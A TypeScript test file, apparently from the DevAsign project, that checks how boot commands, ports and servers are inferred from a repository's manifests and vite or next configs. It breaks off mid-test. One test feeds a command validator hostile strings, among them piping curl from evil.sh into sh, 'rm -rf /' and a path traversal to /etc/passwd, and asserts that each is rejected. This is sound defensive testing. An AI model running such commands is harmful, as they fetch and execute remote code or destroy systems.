// Offline: boot-config inference for root and nested packages. The headline fixture is this
// repository's own tree, read off disk, and the answer it must produce is the
// .devasign.yml that is committed here and runs in CI today.
//   node --import tsx/esm --test src/verify/boot-inference.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { parse } from "yaml";
import { bootConfigFrom, inferBootCandidates, inferenceFilesFor, isKnownStartCommand, readVitePort, runsOnPullRequest, startCommandFor } from "./boot-inference.js";
import { inferSetupFromTree } from "./detect.js";
import { normalizeVerifyBlock, parseDevasignVerify } from "./yml.js";
import { guessVerifyConfig, mergeDevasignYml, stackHints } from "./onboarding/generate.js";

const viteConfig = (port: number, proxy = 8787) => `import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
export default defineConfig({
  plugins: [react()],
  server: {
    port: ${port},
    proxy: {
      '/api': 'http://localhost:${proxy}',
    },
  },
});
`;

const vitePkg = JSON.stringify({
  scripts: { dev: "vite", build: "tsc -b && vite build", preview: "vite preview", test: "node --test 'src/**/*.test.ts'" },
  dependencies: { react: "^18.3.1", "react-dom": "^18.3.1" },
  devDependencies: { "@vitejs/plugin-react": "^6.0.5", typescript: "^5.6.2", vite: "^8.2.1" },
});

const repoFile = (rel: string) => readFileSync(fileURLToPath(new URL(`../../../${rel}`, import.meta.url)), "utf8");

// Read off disk, not paraphrased: a change to these manifests or configs must be able to
// fail this test, because it changes what DevAsign would propose for this repository.
const AGENT_READ = [
  "backend/package.json",
  "backend/.env.example",
  "contributor/package.json",
  "contributor/vite.config.ts",
  "frontend/package.json",
  "frontend/vite.config.ts",
  "frontend/.env.example",
  "verify/package.json",
];

const AGENT_PATHS = [
  ".devasign.yml",
  ".github/workflows/devasign-verify.yml",
  ...AGENT_READ,
  "backend/package-lock.json",
  "backend/src/server.ts",
  "contributor/package-lock.json",
  "frontend/package-lock.json",
  "frontend/src/app.tsx",
  "scripts/devasign-login.mjs",
  "verify/package-lock.json",
].sort();

const AGENT_FILES: Record<string, string | null> = {
  "package.json": null,
  ...Object.fromEntries(AGENT_READ.map((p) => [p, repoFile(p)])),
};

const AGENT_WORKFLOW = repoFile(".github/workflows/devasign-verify.yml");

test("this repository's own tree infers the boot config its committed .devasign.yml uses in CI", () => {
  assert.deepEqual(inferenceFilesFor(AGENT_PATHS), [
    "backend/package.json",
    "backend/.env.example",
    "contributor/package.json",
    "contributor/vite.config.ts",
    "frontend/package.json",
    "frontend/vite.config.ts",
    "frontend/.env.example",
    "verify/package.json",
  ]);

  const candidates = inferBootCandidates({ paths: AGENT_PATHS, files: AGENT_FILES, mode: "extend", workflowTexts: [AGENT_WORKFLOW] });
  assert.deepEqual(candidates.eligibleDirs, ["backend", "contributor", "frontend", "verify"], "no root manifest, and the PR workflow installs each one");
  assert.deepEqual(candidates.webApp, { dir: "frontend", framework: "vite", port: 3001 }, "contributor is also installed by the workflow, so the preferred-name tie-break decides");
  assert.deepEqual(candidates.ambiguousWebApps, []);
  assert.deepEqual(candidates.servers, [{ dir: "backend", name: "backend", script: "dev:ephemeral", port: 8787 }], "verify/ has a dev script but no server dependency");
  assert.equal(candidates.loginScript, "node ./scripts/devasign-login.mjs");

  const cfg = bootConfigFrom(candidates, AGENT_PATHS, AGENT_FILES);
  assert.deepEqual(cfg, {
    start: "npm --prefix frontend run dev -- --port 3001 --strictPort",
    url: "http://localhost:3001",
    ready: "/",
    servers: [{ name: "backend", start: "npm --prefix backend run dev:ephemeral", url: "http://localhost:8787", ready: "/" }],
    login: { script: "node ./scripts/devasign-login.mjs" },
  });
  assert.ok(isKnownStartCommand(cfg.start!, AGENT_PATHS, AGENT_FILES));
  assert.ok(isKnownStartCommand(cfg.servers![0].start, AGENT_PATHS, AGENT_FILES));

  // The committed file is the known-good answer: hand-written, merged, green in CI.
  // Its timeout/check are human refinements inference never proposes.
  const committed = parse(repoFile(".devasign.yml")).verify;
  assert.equal(cfg.start, committed.start);
  assert.equal(cfg.url, committed.url);
  assert.equal(cfg.ready, committed.ready);
  assert.equal(cfg.servers![0].start, committed.servers[0].start);
  assert.equal(cfg.servers![0].url, committed.servers[0].url);
  assert.equal(cfg.servers![0].name, committed.servers[0].name);
  assert.equal(cfg.login!.script, committed.login.script);
  assert.equal(cfg.servers![0].ready, "/");
  assert.equal(committed.servers[0].ready, "/api/health", "inference proposes the root; the maintainer refined it to the health endpoint");
});

// The seam the three slices meet at: everything job.ts does between the tree and the
// file it commits. The committed .devasign.yml is the known-good answer — it runs in CI.
test("the whole pipeline on this repo's tree writes the boot config its committed .devasign.yml uses in CI", () => {
  const COMMITTED = repoFile(".devasign.yml");

  const run = (existing: string | null) => {
    const setup = inferSetupFromTree(AGENT_PATHS, { packageJson: AGENT_FILES["package.json"], envExample: null });
    const hints = stackHints(setup, AGENT_PATHS, null, AGENT_FILES);
    const candidates = inferBootCandidates({ paths: AGENT_PATHS, files: AGENT_FILES, mode: "extend", workflowTexts: [AGENT_WORKFLOW] });
    const verify = guessVerifyConfig(setup, hints, null as never, [], bootConfigFrom(candidates, AGENT_PATHS, AGENT_FILES));
    return mergeDevasignYml(existing, verify);
  };

  const fresh = run(null);
  assert.ok("text" in fresh, "a repo with no .devasign.yml gets one");
  const got = parse(fresh.text).verify;
  const want = parse(COMMITTED).verify;
  assert.equal(got.start, want.start, "frontend vite app on 3001");
  assert.equal(got.url, want.url);
  assert.equal(got.login.script, want.login.script);
  assert.equal(got.servers.length, 1);
  assert.equal(got.servers[0].name, want.servers[0].name);
  assert.equal(got.servers[0].start, want.servers[0].start, "backend ephemeral server");
  assert.equal(got.servers[0].url, want.servers[0].url, "backend on 8787");
  assert.ok(isKnownStartCommand(got.start, AGENT_PATHS, AGENT_FILES));
  assert.ok(isKnownStartCommand(got.servers[0].start, AGENT_PATHS, AGENT_FILES));

  // What we write and what the runner reads must be the same config: the runner parses
  // the committed file through parseDevasignVerify, which drops anything it will not honour.
  const runnerSees = parseDevasignVerify(fresh.text)!;
  assert.equal(runnerSees.start, got.start);
  assert.equal(runnerSees.url, got.url);
  assert.deepEqual(runnerSees.servers, got.servers, "every inferred server survives the runner's own parser");
  assert.deepEqual(runnerSees.login, got.login);

  // Re-running against the committed file must change nothing: every boot key is
  // already set, so the merge adds none and the hand-refined ready/timeout/check stay.
  const again = run(COMMITTED);
  assert.ok("text" in again, "the committed file parses");
  assert.equal(again.text, COMMITTED, "inference agrees with the committed file and never rewrites it");
});

test("an inferred server the runner's parser would drop is never proposed", () => {
  // "app" is both an ordinary directory name and a step name the runner's boot reserves,
  // so a server called that is silently discarded on the other side of the file.
  const paths = ["app/package.json", "app/package-lock.json", "app/.env.example", "frontend/package.json", "frontend/package-lock.json", "frontend/vite.config.ts"];
  const files: Record<string, string | null> = {
    "app/package.json": JSON.stringify({ scripts: { dev: "tsx watch src/main.ts" }, dependencies: { express: "^4" } }),
    "app/.env.example": "PORT=8787\n",
    "frontend/package.json": vitePkg,
    "frontend/vite.config.ts": viteConfig(3001),
  };
  const c = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
  assert.deepEqual(c.servers, [], "a reserved name is dropped at inference, not silently at parse time");
  const cfg = bootConfigFrom(c, paths, files);
  assert.equal(cfg.servers, undefined);
  assert.deepEqual(normalizeVerifyBlock({ e2e: "auto", ...cfg }), { e2e: "auto", ...cfg }, "what inference proposes survives the runner's parser unchanged");
});

test("two vite apps need a tie-break: none leaves no start, a pull-request workflow or a preferred name picks one", () => {
  const paths = ["admin/package.json", "admin/package-lock.json", "admin/vite.config.ts", "ui/package.json", "ui/package-lock.json", "ui/vite.config.ts"];
  const files: Record<string, string | null> = {
    "admin/package.json": vitePkg,
    "admin/vite.config.ts": viteConfig(4100),
    "ui/package.json": vitePkg,
    "ui/vite.config.ts": viteConfig(4200),
  };
  const none = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
  assert.equal(none.webApp, null);
  assert.deepEqual(none.ambiguousWebApps, ["admin", "ui"]);
  assert.deepEqual(none.servers, []);
  assert.deepEqual(bootConfigFrom(none, paths, files), {}, "no start, and no servers or url without one");

  const ci = "name: CI\non:\n  pull_request:\njobs:\n  test:\n    steps:\n      - run: npm ci --prefix admin\n";
  const byWorkflow = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [ci] });
  assert.equal(byWorkflow.webApp?.dir, "admin");
  assert.deepEqual(byWorkflow.ambiguousWebApps, []);

  // A deploy workflow says what it ships, not what CI runs: publishing a docs site from
  // docs/ must not outrank the name of the app the repository actually serves.
  const deploy = "name: Publish docs\non:\n  push:\n    branches: [ main ]\njobs:\n  pages:\n    steps:\n      - run: npm ci --prefix admin\n";
  const byName = inferBootCandidates({
    paths: paths.map((p) => p.replace(/^ui\//, "web/")),
    files: { "admin/package.json": vitePkg, "admin/vite.config.ts": viteConfig(4100), "web/package.json": vitePkg, "web/vite.config.ts": viteConfig(4200) },
    mode: "separate",
    workflowTexts: [deploy],
  });
  assert.deepEqual(byName.webApp, { dir: "web", framework: "vite", port: 4200 });

  assert.equal(runsOnPullRequest(ci), true);
  assert.equal(runsOnPullRequest(deploy), false);
  assert.equal(runsOnPullRequest("on: [push, pull_request]\njobs: {}\n"), true);
  assert.equal(runsOnPullRequest("on:\n  schedule:\n    - cron: '0 0 * * *'\njobs:\n  x:\n    steps:\n      - run: echo pull_request\n"), false);
});

test("a server takes dev:<t> over dev, never a script that builds or tests, and is named by its directory", () => {
  const paths = ["API_v2/package.json", "API_v2/package-lock.json", "API_v2/.env.example", "web/package.json", "web/package-lock.json", "web/vite.config.ts"];
  const api = { dependencies: { fastify: "^5.0.0" } };
  const files = (scripts: Record<string, string>): Record<string, string | null> => ({
    "API_v2/package.json": JSON.stringify({ ...api, scripts }),
    "API_v2/.env.example": "NODE_ENV=test\nPORT=8787\n",
    "web/package.json": vitePkg,
    "web/vite.config.ts": viteConfig(4200),
  });

  const withE2e = files({ build: "tsc", "test:e2e": "playwright test", dev: "tsx watch src/main.ts", "dev:e2e": "tsx src/main.ts" });
  const picked = inferBootCandidates({ paths, files: withE2e, mode: "separate", workflowTexts: [] });
  assert.deepEqual(picked.servers, [{ dir: "API_v2", name: "api-v2", script: "dev:e2e", port: 8787 }]);
  assert.equal(bootConfigFrom(picked, paths, withE2e).servers![0].start, "npm --prefix API_v2 run dev:e2e");

  const onlyTests = files({ build: "tsc", "test:e2e": "playwright test" });
  assert.deepEqual(inferBootCandidates({ paths, files: onlyTests, mode: "separate", workflowTexts: [] }).servers, [], "a test:e2e script is never a way to start a server");
  assert.equal(bootConfigFrom(inferBootCandidates({ paths, files: onlyTests, mode: "separate", workflowTexts: [] }), paths, onlyTests).servers, undefined);

  // The name says "dev"; the command says otherwise. A start command is what it runs.
  const builds = files({ dev: "tsc -b && node dist/main.js" });
  assert.deepEqual(inferBootCandidates({ paths, files: builds, mode: "separate", workflowTexts: [] }).servers, []);
  const tests = files({ start: "vitest run --api" });
  assert.deepEqual(inferBootCandidates({ paths, files: tests, mode: "separate", workflowTexts: [] }).servers, []);
  const serves = files({ dev: "node build/server.js" });
  assert.equal(inferBootCandidates({ paths, files: serves, mode: "separate", workflowTexts: [] }).servers.length, 1, "a path called build/ is not a build step");
});

test("a proxy target is only paired with a server package that says it listens there", () => {
  // The proxy points at a Python API on 8000; the only node server package is a queue
  // worker on a port of its own. Pairing them boots the wrong process and then fails the
  // whole run waiting for a URL it never serves — worse than inferring no server at all.
  const paths = ["web/package.json", "web/package-lock.json", "web/vite.config.ts", "worker/package.json", "worker/package-lock.json", "worker/.env.example"];
  const files = (env: string): Record<string, string | null> => ({
    "web/package.json": vitePkg,
    "web/vite.config.ts": viteConfig(3000, 8000),
    "worker/package.json": JSON.stringify({ scripts: { dev: "tsx watch src/worker.ts" }, dependencies: { express: "^4" } }),
    "worker/.env.example": env,
  });
  const unrelated = files("PORT=9001\n");
  assert.deepEqual(inferBootCandidates({ paths, files: unrelated, mode: "separate", workflowTexts: [] }).servers, [], "nothing ties worker/ to :8000");
  assert.deepEqual(bootConfigFrom(inferBootCandidates({ paths, files: unrelated, mode: "separate", workflowTexts: [] }), paths, unrelated).servers, undefined);

  const owned = files("PORT=8000\n");
  assert.deepEqual(inferBootCandidates({ paths, files: owned, mode: "separate", workflowTexts: [] }).servers, [{ dir: "worker", name: "worker", script: "dev", port: 8000 }]);

  // An origin the app declares for itself is not a proxy target, so it never becomes a server.
  const own = {
    ...files("PORT=3000\n"),
    "web/vite.config.ts": "export default { server: { port: 3000, origin: 'http://localhost:3000', proxy: {} } };",
  };
  assert.deepEqual(inferBootCandidates({ paths, files: own, mode: "separate", workflowTexts: [] }).servers, [], "the app's own port is not a backend");
});

test("a nested package is only eligible when CI installs it: a root manifest, or their own PR workflow", () => {
  const paths = ["package.json", "package-lock.json", "frontend/package.json", "frontend/vite.config.ts"];
  const files = (root: object): Record<string, string | null> => ({
    "package.json": JSON.stringify(root),
    "frontend/package.json": vitePkg,
    "frontend/vite.config.ts": viteConfig(3001),
  });

  const extend = inferBootCandidates({ paths, files: files({ name: "root" }), mode: "extend", workflowTexts: [] });
  assert.deepEqual(extend.eligibleDirs, ["."], "their workflow installs the root only, and we do not edit its steps");
  assert.equal(extend.webApp, null, "the root manifest has no vite or next of its own");

  const separate = inferBootCandidates({ paths, files: files({ name: "root" }), mode: "separate", workflowTexts: [] });
  assert.deepEqual(separate.eligibleDirs, [".", "frontend"], "our own workflow gets an install step for it");
  assert.equal(separate.webApp?.dir, "frontend");

  const workspace = inferBootCandidates({ paths, files: files({ name: "root", workspaces: ["frontend", "packages/*"] }), mode: "extend", workflowTexts: [] });
  assert.deepEqual(workspace.eligibleDirs, [".", "frontend"]);
  assert.equal(bootConfigFrom(workspace, paths, files({ name: "root", workspaces: ["frontend"] })).url, "http://localhost:3001");

  // No root manifest in extend mode: we add no install steps, so only what their CI
  // already installs can be booted. api/'s node_modules would never exist.
  const rootless = ["api/package.json", "api/package-lock.json", "web/package.json", "web/package-lock.json", "web/vite.config.ts"];
  const rootlessFiles: Record<string, string | null> = { "api/package.json": vitePkg, "web/package.json": vitePkg, "web/vite.config.ts": viteConfig(3001) };
  const theirCi = "on:\n  pull_request:\njobs:\n  test:\n    steps:\n      - run: npm ci --prefix api\n";
  const partial = inferBootCandidates({ paths: rootless, files: rootlessFiles, mode: "extend", workflowTexts: [theirCi] });
  assert.deepEqual(partial.eligibleDirs, ["api"], "web/ is never installed by their workflow");
  assert.equal(partial.webApp?.dir, "api");
  assert.deepEqual(inferBootCandidates({ paths: rootless, files: rootlessFiles, mode: "separate", workflowTexts: [] }).eligibleDirs, ["api", "web"], "our own workflow installs both");
});

// devasignhq/website: one package, at the repository root. Its vite config pins 3001 and
// its dev script carries no flags, so nothing but the config says where the app answers.
const ROOT_VITE_PKG = JSON.stringify({
  scripts: { dev: "vite", build: "vite build", preview: "vite preview" },
  dependencies: { react: "^19.0.0", "react-dom": "^19.0.0" },
  devDependencies: { "@vitejs/plugin-react": "^4.3.4", typescript: "~5.6.2", vite: "^6.0.5" },
});
const ROOT_VITE_CONFIG = `import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
export default defineConfig({
  plugins: [react()],
  server: { port: 3001 },
});
`;
const WEBSITE_PATHS = ["package.json", "package-lock.json", "vite.config.ts", "index.html", "src/main.tsx", "tsconfig.json"];
const WEBSITE_FILES: Record<string, string | null> = { "package.json": ROOT_VITE_PKG, "vite.config.ts": ROOT_VITE_CONFIG };

/** Everything job.ts does between the tree and the file it commits. */
function pipeline(args: { paths: string[]; files: Record<string, string | null>; existing?: string | null; mode?: "separate" | "extend" }) {
  const { paths, files } = args;
  const pkg = files["package.json"] ? JSON.parse(files["package.json"]) : null;
  const setup = inferSetupFromTree(paths, { packageJson: files["package.json"], envExample: files[".env.example"] ?? null });
  const hints = stackHints(setup, paths, pkg, files);
  const candidates = inferBootCandidates({ paths, files, mode: args.mode ?? "separate", workflowTexts: [] });
  const verify = guessVerifyConfig(setup, hints, pkg, [], bootConfigFrom(candidates, paths, files));
  return { verify, merged: mergeDevasignYml(args.existing ?? null, verify) };
}

test("a repo whose only package is the root boots from the port its own vite config pins, not the 5173 guess", () => {
  assert.deepEqual(inferenceFilesFor(WEBSITE_PATHS), ["vite.config.ts"], "the root config is the one extra read a single-package repo needs");

  const c = inferBootCandidates({ paths: WEBSITE_PATHS, files: WEBSITE_FILES, mode: "separate", workflowTexts: [] });
  assert.deepEqual(c.eligibleDirs, ["."], "every workflow installs the root, ours and theirs alike");
  assert.deepEqual(c.webApp, { dir: ".", framework: "vite", port: 3001 });
  assert.deepEqual(c.servers, [], "one root package is one process");
  assert.deepEqual(c.ambiguousWebApps, []);

  const cfg = bootConfigFrom(c, WEBSITE_PATHS, WEBSITE_FILES);
  assert.deepEqual(cfg, { start: "npm run dev -- --port 3001 --strictPort", url: "http://localhost:3001", ready: "/" });
  assert.ok(isKnownStartCommand(cfg.start!, WEBSITE_PATHS, WEBSITE_FILES));
  assert.deepEqual(normalizeVerifyBlock({ e2e: "auto", ...cfg }), { e2e: "auto", ...cfg }, "what inference proposes survives the runner's parser unchanged");

  const { verify, merged } = pipeline({ paths: WEBSITE_PATHS, files: WEBSITE_FILES });
  assert.equal(verify.start, "npm run dev -- --port 3001 --strictPort", "the hardcoded root guess does not survive an inferred start");
  assert.equal(verify.url, "http://localhost:3001");
  assert.equal(verify.ready, "/");
  assert.ok("text" in merged);
  assert.equal(parseDevasignVerify(merged.text)!.url, "http://localhost:3001", "and the runner reads back exactly what we wrote");
});

test("a root app pins even the default port, and a root next app takes the port from its own dev script", () => {
  const paths = ["package.json", "package-lock.json", "index.html", "src/main.tsx"];
  const files: Record<string, string | null> = { "package.json": ROOT_VITE_PKG };
  const vite = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
  assert.deepEqual(vite.webApp, { dir: ".", framework: "vite", port: 5173 }, "vite's own default when no config pins one");
  assert.equal(
    bootConfigFrom(vite, paths, files).start,
    "npm run dev -- --port 5173 --strictPort",
    "an occupied 5173 must fail the boot: without --strictPort vite moves the app and the probe waits on a dead url"
  );

  const nextPaths = ["package.json", "package-lock.json", "next.config.mjs", "app/page.tsx"];
  for (const [dev, port] of [["next dev -p 4000", 4000], ["next dev --port 4100", 4100], ["next dev", 3000]] as const) {
    const nextFiles: Record<string, string | null> = {
      "package.json": JSON.stringify({ scripts: { dev, build: "next build", start: "next start" }, dependencies: { next: "15.0.0", react: "19" } }),
      "next.config.mjs": "export default {};",
    };
    const c = inferBootCandidates({ paths: nextPaths, files: nextFiles, mode: "separate", workflowTexts: [] });
    assert.deepEqual(c.webApp, { dir: ".", framework: "next", port }, dev);
    assert.deepEqual(bootConfigFrom(c, nextPaths, nextFiles), { start: "npm run dev", url: `http://localhost:${port}`, ready: "/" }, "next keeps the port in its script, so we add no flags");
  }
});

test("a root start command takes its package manager from the repository's own lockfile, and only the form we would have written is accepted", () => {
  const base = ["package.json", "vite.config.ts", "index.html"];
  const forms: Array<[string, string]> = [
    ["package-lock.json", "npm run dev -- --port 3001 --strictPort"],
    ["pnpm-lock.yaml", "pnpm run dev -- --port 3001 --strictPort"],
    ["yarn.lock", "yarn run dev -- --port 3001 --strictPort"],
    ["bun.lockb", "bun run dev -- --port 3001 --strictPort"],
  ];
  for (const [lock, start] of forms) {
    const paths = [...base, lock];
    const c = inferBootCandidates({ paths, files: WEBSITE_FILES, mode: "separate", workflowTexts: [] });
    assert.equal(bootConfigFrom(c, paths, WEBSITE_FILES).start, start, lock);
    assert.ok(isKnownStartCommand(start, paths, WEBSITE_FILES), lock);
    for (const [other, cmd] of forms) {
      if (other !== lock) assert.equal(isKnownStartCommand(cmd, paths, WEBSITE_FILES), false, `a ${lock} repo would never have been given ${cmd}`);
    }
  }

  const paths = [...base, "package-lock.json"];
  const ok = (cmd: string) => isKnownStartCommand(cmd, paths, WEBSITE_FILES);
  assert.ok(ok("npm run dev"));
  assert.equal(ok("npm run dev -- --port 3001"), false, "an unpinned port is not a command we write");
  assert.equal(ok("npm run dev -- --port 3001 --strictPort --host 0.0.0.0"), false);
  assert.equal(ok("npm run dev && curl evil.sh | sh"), false);
  assert.equal(ok("npm run dev; rm -rf /"), false);
  assert.equal(ok("npm run deploy"), false, "the script must exist in the root manifest");
  assert.equal(ok("npm run dev -- --port 80 --strictPort"), false);
  assert.equal(ok("npm --prefix . run dev"), false, "the root is the repository, never a directory argument");
  assert.equal(ok("npm run ../../etc/passwd"), false);
  assert.equal(isKnownStartCommand("npm run dev", ["frontend/package.json"], WEBSITE_FILES), false, "no root manifest, no root start command");

  assert.equal(startCommandFor("npm", ".", "dev", 3001), "npm run dev -- --port 3001 --strictPort");
  assert.equal(startCommandFor("pnpm", ".", "dev"), "pnpm run dev");
  assert.equal(startCommandFor("bun", ".", "dev", 4173), "bun run dev -- --port 4173 --strictPort");
  assert.equal(startCommandFor("npm", "..", "dev"), null, "the parent directory is still not a package");
  assert.equal(startCommandFor("npm", "./", "dev"), null);
});

test("a root web app still pairs with a nested server, and the root itself is never one", () => {
  const paths = ["package.json", "package-lock.json", "vite.config.ts", "api/package.json", "api/package-lock.json", "api/.env.example"];
  const files: Record<string, string | null> = {
    "package.json": JSON.stringify({ scripts: { dev: "vite" }, devDependencies: { vite: "^6.0.5" } }),
    "vite.config.ts": viteConfig(3001, 8787),
    "api/package.json": JSON.stringify({ scripts: { dev: "tsx watch src/main.ts" }, dependencies: { express: "^4.19.2" } }),
    "api/.env.example": "PORT=8787\n",
  };
  const c = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
  assert.deepEqual(c.webApp, { dir: ".", framework: "vite", port: 3001 });
  assert.deepEqual(c.servers, [{ dir: "api", name: "api", script: "dev", port: 8787 }], "the root app's proxy target is served by the one package that claims that port");
  const cfg = bootConfigFrom(c, paths, files);
  assert.equal(cfg.start, "npm run dev -- --port 3001 --strictPort");
  assert.deepEqual(cfg.servers, [{ name: "api", start: "npm --prefix api run dev", url: "http://localhost:8787", ready: "/" }]);

  // The mirror image: the root is the API and the app is nested. The root is the one
  // thing CI always installs, but a package with no name of its own cannot be a server.
  const mirrorPaths = ["package.json", "package-lock.json", ".env.example", "web/package.json", "web/vite.config.ts"];
  const mirrorFiles: Record<string, string | null> = {
    "package.json": JSON.stringify({ scripts: { dev: "node server.js" }, dependencies: { express: "^4.19.2" } }),
    ".env.example": "PORT=8787\n",
    "web/package.json": vitePkg,
    "web/vite.config.ts": viteConfig(3001, 8787),
  };
  const mirror = inferBootCandidates({ paths: mirrorPaths, files: mirrorFiles, mode: "separate", workflowTexts: [] });
  assert.equal(mirror.webApp?.dir, "web");
  // Two gates keep the root out: the explicit filter, and slug("."), which is always null.
  // No fixture can isolate them, so this asserts the property, not one of its causes.
  assert.deepEqual(mirror.servers, [], "the root package is never paired as a second process");
  assert.equal(bootConfigFrom(mirror, mirrorPaths, mirrorFiles).servers, undefined);
});

test("a repo that already set its own start and url is left byte for byte alone by a regenerate", () => {
  // mergeDevasignYml is additive, so what inference now proposes for a root repo can only
  // ever reach a repo that has no boot of its own. This is the whole blast radius.
  const existing = [
    "# .devasign.yml — hand-written before inference could read this repo.",
    "verify:",
    "  e2e: auto",
    "  start: npm run dev -- --port 5173",
    "  url: http://localhost:5173",
    "  ready: /",
    "",
  ].join("\n");
  const again = pipeline({ paths: WEBSITE_PATHS, files: WEBSITE_FILES, existing });
  assert.ok("text" in again.merged);
  assert.equal(again.merged.text, existing, "their boot is never re-derived, even when inference disagrees with the port");
  assert.equal(parse(again.merged.text).verify.start, "npm run dev -- --port 5173");
});

// A workspace root that owns vite for a root vitest workspace, with a `dev` that only fans
// out, is a candidate on paper — and neither earlier tie-break can separate it from a real app.
const WORKSPACE_ROOT_PKG = (dev: string) =>
  JSON.stringify({
    private: true,
    workspaces: ["*"],
    scripts: { dev, test: "vitest run" },
    devDependencies: { vite: "^6.0.5", vitest: "^2.1.8" },
  });

test("a workspace root that merely owns vite is a container, not the app: a nested app beats it", () => {
  const paths = ["package.json", "package-lock.json", "dashboard/package.json", "dashboard/vite.config.ts", "dashboard/index.html"];
  // `dashboard` is not one of the preferred names, so nothing but "nested beats root" can
  // pick it — and picking the root would boot turbo, or a vite with no app, at 5173.
  for (const dev of ["turbo run dev", 'concurrently "npm:dev:*"', "npm run dev --workspace dashboard", "vite"]) {
    const files: Record<string, string | null> = {
      "package.json": WORKSPACE_ROOT_PKG(dev),
      "dashboard/package.json": vitePkg,
      "dashboard/vite.config.ts": viteConfig(3001),
    };
    const c = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
    assert.deepEqual(c.eligibleDirs, [".", "dashboard"], dev);
    assert.deepEqual(c.webApp, { dir: "dashboard", framework: "vite", port: 3001 }, dev);
    assert.deepEqual(c.ambiguousWebApps, [], `${dev}: naming both is how the answer silently became the root's 5173 guess`);
    assert.equal(bootConfigFrom(c, paths, files).start, "npm --prefix dashboard run dev -- --port 3001 --strictPort", dev);
    assert.equal(bootConfigFrom(c, paths, files).url, "http://localhost:3001", dev);
    // And nothing downstream falls back to the hardcoded root guess.
    const { verify } = pipeline({ paths, files });
    assert.equal(verify.start, "npm --prefix dashboard run dev -- --port 3001 --strictPort", dev);
    assert.equal(verify.url, "http://localhost:3001", dev);
  }

  // The control, and the reason the rule is "nested beats root" and not "root never wins":
  // a repo whose only package is the root is still its own app.
  const alone = inferBootCandidates({ paths: WEBSITE_PATHS, files: WEBSITE_FILES, mode: "separate", workflowTexts: [] });
  assert.deepEqual(alone.webApp, { dir: ".", framework: "vite", port: 3001 });

  // A preferred nested name still settles it before the root ever comes up.
  const preferredPaths = ["package.json", "package-lock.json", "frontend/package.json", "frontend/vite.config.ts"];
  const preferredFiles: Record<string, string | null> = {
    "package.json": WORKSPACE_ROOT_PKG("turbo run dev"),
    "frontend/package.json": vitePkg,
    "frontend/vite.config.ts": viteConfig(3001),
  };
  assert.equal(inferBootCandidates({ paths: preferredPaths, files: preferredFiles, mode: "separate", workflowTexts: [] }).webApp?.dir, "frontend");

  // Two nested apps are still genuinely ambiguous: the root dropping out decides nothing.
  const twoPaths = [...paths, "docs/package.json", "docs/vite.config.ts"];
  const twoFiles: Record<string, string | null> = {
    "package.json": WORKSPACE_ROOT_PKG("turbo run dev"),
    "dashboard/package.json": vitePkg,
    "dashboard/vite.config.ts": viteConfig(3001),
    "docs/package.json": vitePkg,
    "docs/vite.config.ts": viteConfig(4100),
  };
  const two = inferBootCandidates({ paths: twoPaths, files: twoFiles, mode: "separate", workflowTexts: [] });
  assert.equal(two.webApp, null);
  assert.deepEqual(two.ambiguousWebApps, ["dashboard", "docs"], "the root is not one of the two the maintainer has to choose between");
});

// The `server` key is not unique in a vite config: vitest is configured in the same file
// (`test: { server: { deps: … } }`), and a plugin may take an option of that name.
const VITEST_SHADOW_CONFIG = `import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
export default defineConfig({
  plugins: [react()],
  test: {
    environment: 'jsdom',
    server: { deps: { inline: ['@acme/ui'] } },
  },
  server: {
    port: 3001,
    proxy: { '/api': 'http://localhost:8787' },
  },
});
`;

const PLUGIN_SHADOW_CONFIG = `import { defineConfig } from 'vite';
import mock from 'vite-plugin-mock';
export default defineConfig({
  plugins: [mock({ server: { port: 9999 } })],
  server: { port: 3001, proxy: { '/api': 'http://localhost:8787' } },
});
`;

// A regex literal ending in an escaped slash is the classic `~/` alias, and a comment
// scanner that does not know about escapes reads its `\/` as the start of a line comment.
const REGEX_ALIAS_CONFIG = `import { defineConfig } from 'vite';
export default defineConfig({
  plugins: [],
  resolve: { alias: [{ find: /^~\\//, replacement: '/src/' }] }, server: { port: 3001, proxy: { '/api': 'http://localhost:8787' } },
});
`;

test("the dev-server port is read from the exported config's own server block, whatever else is called server", () => {
  assert.equal(readVitePort(VITEST_SHADOW_CONFIG), 3001, "a vitest test.server must not shadow the real one");
  assert.equal(readVitePort(PLUGIN_SHADOW_CONFIG), 3001, "nor a plugin option of the same name");
  assert.equal(readVitePort(REGEX_ALIAS_CONFIG), 3001, "nor may an alias regex eat the line the block sits on");
  assert.equal(readVitePort(viteConfig(3001)), 3001, "and the plain shape still reads the same");
  assert.equal(readVitePort("export default { test: { server: { deps: {} } } };"), null, "a file with only a nested server pins nothing");

  // One shadow costs the port AND the whole proxy-derived servers list, and a browser
  // criterion that then fails on a missing /api reads as the app's own fault.
  const paths = ["package.json", "package-lock.json", "vite.config.ts", "api/package.json", "api/.env.example"];
  const api = {
    "api/package.json": JSON.stringify({ scripts: { dev: "tsx watch src/main.ts" }, dependencies: { express: "^4.19.2" } }),
    "api/.env.example": "PORT=8787\n",
  };
  const rootPkg = JSON.stringify({ scripts: { dev: "vite" }, devDependencies: { vite: "^6.0.5", vitest: "^2.1.8" } });
  for (const [label, config] of [["vitest", VITEST_SHADOW_CONFIG], ["a plugin option", PLUGIN_SHADOW_CONFIG], ["an alias regex", REGEX_ALIAS_CONFIG]] as const) {
    const files: Record<string, string | null> = { "package.json": rootPkg, "vite.config.ts": config, ...api };
    const c = inferBootCandidates({ paths, files, mode: "separate", workflowTexts: [] });
    assert.deepEqual(c.webApp, { dir: ".", framework: "vite", port: 3001 }, label);
    assert.deepEqual(c.servers, [{ dir: "api", name: "api", script: "dev", port: 8787 }], `${label} must not delete the API the app proxies to`);
    const cfg = bootConfigFrom(c, paths, files);
    assert.equal(cfg.start, "npm run dev -- --port 3001 --strictPort", label);
    assert.deepEqual(cfg.servers, [{ name: "api", start: "npm --prefix api run dev", url: "http://localhost:8787", ready: "/" }], label);
  }
});

test("a root script name a shell would read as more than one word is refused, space or no space", () => {
  // The runner runs the command through `sh -c`, and only a space-free name reaches
